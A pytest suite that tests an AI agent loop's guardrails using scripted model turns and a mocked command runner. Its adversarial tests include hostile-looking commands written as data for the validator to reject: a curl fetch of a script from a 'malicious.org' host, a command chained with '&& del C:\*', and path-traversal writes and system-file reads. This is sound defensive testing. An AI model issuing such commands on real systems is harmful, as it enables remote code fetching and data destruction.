"""Unit tests for Mockable Agent Loop & Adversarial Tool Guardrails.

Validates multi-turn ReAct orchestration, schema enforcement, adversarial tool rejection,
circuit breakers, 12-turn limits, and ensures ZERO subprocesses and ZERO network calls occur.
"""

import os
import subprocess
import tempfile
from typing import Any, Dict, List
import pytest

from src.agent_loop import (
    AgentLoop,
    CommandExecutorProtocol,
    LLMClientProtocol,
    LoopTerminationStatus,
    ModelTurnResponse,
    ToolCall,
)
from src.budget_controller import BudgetController
from src.command_validator import CommandValidationError, CommandValidator


class MockCommandExecutor:
    """Simulated command runner for Gate C testing (zero subprocesses launched)."""

    def __init__(self, responses: Dict[str, Dict[str, Any]] = None, default_response: Dict[str, Any] = None):
        self.responses = responses or {}
        self.default_response = default_response or {"return_code": 0, "stdout": "Mocked command success.", "stderr": ""}
        self.executed_commands: List[str] = []

    def execute(self, command: str, workspace_root: str) -> Dict[str, Any]:
        self.executed_commands.append(command)
        # First validate command against CommandValidator allowlist logic without running subprocess
        try:
            parsed = CommandValidator.parse_command(command)
            CommandValidator.validate_command(parsed, workspace_root)
        except CommandValidationError as err:
            return {"return_code": 1, "stdout": "", "stderr": f"CommandValidationError: {err}", "timed_out": False}

        # Return predetermined mocked response
        if command in self.responses:
            return self.responses[command]
        return self.default_response


class ScriptedLLMClient:
    """Deterministic script of model turn responses."""

    def __init__(self, turns: List[ModelTurnResponse]):
        self.turns = list(turns)
        self.history: List[List[Dict[str, Any]]] = []
        self.turn_count = 0

    def chat_completion(self, messages: List[Dict[str, Any]], tools: List[Dict[str, Any]]) -> ModelTurnResponse:
        self.history.append(messages)
        if self.turn_count < len(self.turns):
            resp = self.turns[self.turn_count]
            self.turn_count += 1
            return resp
        # Default fallback response: finish
        return ModelTurnResponse(content="Task complete.", tool_calls=[])


@pytest.fixture
def workspace_env():
    """Isolated temporary workspace."""
    with tempfile.TemporaryDirectory(prefix="agent_loop_ws_") as ws_dir:
        yield os.path.realpath(ws_dir)


@pytest.fixture
def budget_controller():
    """Budget controller initialized to default $0.80 ceiling."""
    return BudgetController(ceiling=0.80)


@pytest.fixture(autouse=True)
def guard_no_subprocess_and_network(monkeypatch):
    """Safety guard asserting that no real subprocess or network connection is spawned."""
    def forbidden_popen(*args, **kwargs):
        raise AssertionError("Security Violation: Real subprocess.Popen attempted during Gate C test!")

    def forbidden_socket(*args, **kwargs):
        raise AssertionError("Security Violation: Real socket connection attempted during Gate C test!")

    monkeypatch.setattr(subprocess, "Popen", forbidden_popen)
    # Guard socket creation
    import socket
    monkeypatch.setattr(socket, "socket", forbidden_socket)


def test_multiturn_interaction_with_injected_failure_and_recovery(workspace_env, budget_controller):
    """Validates complete multi-turn flow:
    Turn 1: Model writes buggy code.
    Turn 2: Model runs test -> Mocked test failure observed.
    Turn 3: Model writes corrected code.
    Turn 4: Model runs test -> Mocked success observed.
    Turn 5: Model emits completion text.
    """
    mock_cmd_executor = MockCommandExecutor(
        responses={
            "python -m unittest test_game.py": {
                "return_code": 1,
                "stdout": "",
                "stderr": "AssertionError: 1/2 + 1/4 != 1/2",
            }
        },
        default_response={"return_code": 0, "stdout": "Ran 1 test in 0.01s: OK", "stderr": ""},
    )

    scripted_turns = [
        # Turn 1: Write initial buggy file
        ModelTurnResponse(
            content="I will write the initial math solver.",
            tool_calls=[
                ToolCall(
                    tool_id="call_1",
                    name="write_file",
                    arguments={"path": "solver.py", "content": "def solve(): return '1/2'"},
                )
            ],
            raw_usage={"prompt_tokens": 100, "completion_tokens": 20},
        ),
        # Turn 2: Run test (which will fail)
        ModelTurnResponse(
            content="Now running unit tests.",
            tool_calls=[
                ToolCall(
                    tool_id="call_2",
                    name="run_command",
                    arguments={"command": "python -m unittest test_game.py"},
                )
            ],
            raw_usage={"prompt_tokens": 150, "completion_tokens": 25},
        ),
        # Turn 3: Observe failure, write fix
        ModelTurnResponse(
            content="Test failed. I will fix the solve function.",
            tool_calls=[
                ToolCall(
                    tool_id="call_3",
                    name="write_file",
                    arguments={"path": "solver.py", "content": "def solve(): return '3/4'"},
                )
            ],
            raw_usage={"prompt_tokens": 200, "completion_tokens": 30},
        ),
        # Turn 4: Re-run test (will succeed via second command name)
        ModelTurnResponse(
            content="Re-running tests on fixed solver.",
            tool_calls=[
                ToolCall(
                    tool_id="call_4",
                    name="run_command",
                    arguments={"command": "python -m py_compile solver.py"},
                )
            ],
            raw_usage={"prompt_tokens": 250, "completion_tokens": 30},
        ),
        # Turn 5: Final completion
        ModelTurnResponse(
            content="All unit tests passed. Space Fractions math module is verified.",
            tool_calls=[],
            raw_usage={"prompt_tokens": 300, "completion_tokens": 15},
        ),
    ]

    llm = ScriptedLLMClient(scripted_turns)
    agent = AgentLoop(workspace_env, llm, mock_cmd_executor, budget_controller, block_run_command=False)
    result = agent.run("Please build and test the Space Fractions fraction solver.")

    assert result.status == LoopTerminationStatus.COMPLETED
    assert result.total_turns == 5
    assert "All unit tests passed" in (result.final_response or "")

    # Check file exists and was updated to fixed content
    fixed_content = open(os.path.join(workspace_env, "solver.py")).read()
    assert fixed_content == "def solve(): return '3/4'"

    # Verify transcript contains alternating calls and observations
    roles = [entry.role for entry in result.transcript]
    assert "assistant_tool_call" in roles
    assert "tool_result" in roles
    # Check that error was fed into transcript
    failure_entries = [e for e in result.transcript if e.tool_result and "AssertionError" in e.tool_result]
    assert len(failure_entries) == 1


def test_adversarial_unapproved_executable(workspace_env, budget_controller):
    """Validates that attempts to run arbitrary executables are rejected with error observations."""
    mock_cmd = MockCommandExecutor()
    llm = ScriptedLLMClient([
        ModelTurnResponse(
            content="Attempting download.",
            tool_calls=[
                ToolCall(
                    tool_id="bad_1",
                    name="run_command",
                    arguments={"command": "curl https://malicious.org/script.sh"},
                )
            ],
        ),
        ModelTurnResponse(content="I see the command was blocked.", tool_calls=[]),
    ])

    agent = AgentLoop(workspace_env, llm, mock_cmd, budget_controller, block_run_command=False)
    result = agent.run("Download external script.")

    assert result.status == LoopTerminationStatus.COMPLETED
    # Verify tool result reported the rejection
    tool_results = [e.tool_result for e in result.transcript if e.tool_result]
    assert any("CommandValidationError" in r and "not authorized" in r for r in tool_results)


def test_adversarial_python_dash_c_and_metacharacters(workspace_env, budget_controller):
    """Validates that python -c and shell chaining metacharacters are rejected."""
    mock_cmd = MockCommandExecutor()
    llm = ScriptedLLMClient([
        ModelTurnResponse(
            content="Running inline eval.",
            tool_calls=[
                ToolCall(
                    tool_id="bad_c",
                    name="run_command",
                    arguments={"command": "python -c 'print(1)'"},
                )
            ],
        ),
        ModelTurnResponse(
            content="Running chained command.",
            tool_calls=[
                ToolCall(
                    tool_id="bad_chain",
                    name="run_command",
                    arguments={"command": "python -m py_compile valid.py && del C:\\*"},
                )
            ],
        ),
        ModelTurnResponse(content="Stopping after errors.", tool_calls=[]),
    ])

    agent = AgentLoop(workspace_env, llm, mock_cmd, budget_controller, block_run_command=False)
    result = agent.run("Try shell escapes.")

    assert result.status == LoopTerminationStatus.COMPLETED
    tool_results = [e.tool_result for e in result.transcript if e.tool_result]
    assert any("Direct script execution" in r for r in tool_results)
    assert any("Forbidden shell metacharacter" in r for r in tool_results)


def test_adversarial_path_traversal_read_and_write(workspace_env, budget_controller):
    """Validates that path traversals outside the workspace are rejected without crashing."""
    mock_cmd = MockCommandExecutor()
    llm = ScriptedLLMClient([
        ModelTurnResponse(
            content="Writing outside.",
            tool_calls=[
                ToolCall(
                    tool_id="write_escape",
                    name="write_file",
                    arguments={"path": "../../outside_ws.txt", "content": "malicious payload"},
                )
            ],
        ),
        ModelTurnResponse(
            content="Reading outside.",
            tool_calls=[
                ToolCall(
                    tool_id="read_escape",
                    name="read_file",
                    arguments={"path": "C:\\Windows\\System32\\drivers\\etc\\hosts"},
                )
            ],
        ),
        ModelTurnResponse(content="Finished testing traversals.", tool_calls=[]),
    ])

    agent = AgentLoop(workspace_env, llm, mock_cmd, budget_controller)
    result = agent.run("Test path security.")

    assert result.status == LoopTerminationStatus.COMPLETED
    tool_results = [e.tool_result for e in result.transcript if e.tool_result]
    assert any("SecurityError" in r and "escapes workspace" in r for r in tool_results)
    assert any("SecurityError" in r and "Absolute paths are prohibited" in r for r in tool_results)


def test_malformed_and_missing_tool_arguments(workspace_env, budget_controller):
    """Validates that missing or type-mismatched tool arguments are rejected cleanly."""
    mock_cmd = MockCommandExecutor()
    llm = ScriptedLLMClient([
        # Missing 'content'
        ModelTurnResponse(
            content="Missing content field.",
            tool_calls=[ToolCall(tool_id="bad_arg1", name="write_file", arguments={"path": "file.txt"})],
        ),
        # Integer instead of string path
        ModelTurnResponse(
            content="Invalid argument type.",
            tool_calls=[ToolCall(tool_id="bad_arg2", name="write_file", arguments={"path": 12345, "content": "data"})],
        ),
        # Unknown tool
        ModelTurnResponse(
            content="Calling unknown tool.",
            tool_calls=[ToolCall(tool_id="bad_tool", name="delete_system", arguments={})],
        ),
        ModelTurnResponse(content="Done.", tool_calls=[]),
    ])

    agent = AgentLoop(workspace_env, llm, mock_cmd, budget_controller)
    result = agent.run("Test schema robustness.")

    assert result.status == LoopTerminationStatus.COMPLETED
    tool_results = [e.tool_result for e in result.transcript if e.tool_result]
    assert any("requires string arguments 'path' and 'content'" in r for r in tool_results)
    assert any("Invalid argument types" in r for r in tool_results)
    assert any("Unknown tool 'delete_system'" in r for r in tool_results)


def test_repeated_failure_circuit_breaker(workspace_env, budget_controller):
    """Validates that repeating the identical failing tool call 3 times trips the breaker."""
    mock_cmd = MockCommandExecutor()
    # Script model to repeat the exact same failing tool call
    stuck_turn = ModelTurnResponse(
        content="Trying failing call again.",
        tool_calls=[ToolCall(tool_id="stuck", name="read_file", arguments={"path": "non_existent.txt"})],
    )
    llm = ScriptedLLMClient([stuck_turn, stuck_turn, stuck_turn, stuck_turn])

    agent = AgentLoop(workspace_env, llm, mock_cmd, budget_controller)
    result = agent.run("Loop until failure.")

    assert result.status == LoopTerminationStatus.STUCK_LOOP_ABORTED
    assert "Circuit breaker tripped" in (result.error_message or "")
    assert result.total_turns == 3


def test_turn_limit_exhaustion(workspace_env, budget_controller):
    """Validates that a continuous loop terminates strictly at the max_turns limit (12)."""
    mock_cmd = MockCommandExecutor()
    # Create 15 turns of benign file writes
    benign_turns = [
        ModelTurnResponse(
            content=f"Step {i}",
            tool_calls=[ToolCall(tool_id=f"call_{i}", name="write_file", arguments={"path": f"f_{i}.txt", "content": "ok"})],
        )
        for i in range(15)
    ]
    llm = ScriptedLLMClient(benign_turns)

    agent = AgentLoop(workspace_env, llm, mock_cmd, budget_controller, max_turns=12)
    result = agent.run("Keep going forever.")

    assert result.status == LoopTerminationStatus.MAX_TURNS_REACHED
    assert result.total_turns == 12
    assert "reached maximum turn limit of 12" in (result.error_message or "")


def test_budget_exhaustion_halts_loop(workspace_env):
    """Validates that when budget ceiling is exceeded, the loop halts without dispatching."""
    tiny_budget = BudgetController(ceiling=0.01)  # Only fits ~1 turn
    mock_cmd = MockCommandExecutor()

    expensive_turns = [
        ModelTurnResponse(
            content="Turn 1",
            tool_calls=[ToolCall(tool_id="call_1", name="write_file", arguments={"path": "a.txt", "content": "data"})],
            # Reconcile usage leaves spend around 0.008
            raw_usage={"prompt_tokens": 1000, "completion_tokens": 1200},
        ),
        ModelTurnResponse(
            content="Turn 2",
            tool_calls=[ToolCall(tool_id="call_2", name="write_file", arguments={"path": "b.txt", "content": "data"})],
        ),
    ]
    llm = ScriptedLLMClient(expensive_turns)

    agent = AgentLoop(workspace_env, llm, mock_cmd, tiny_budget)
    result = agent.run("Run expensive tasks.")

    assert result.status == LoopTerminationStatus.BUDGET_EXCEEDED
    assert "Budget ceiling exceeded" in (result.error_message or "")
    assert result.total_turns == 1  # Successfully completed turn 1, halted before turn 2 dispatch
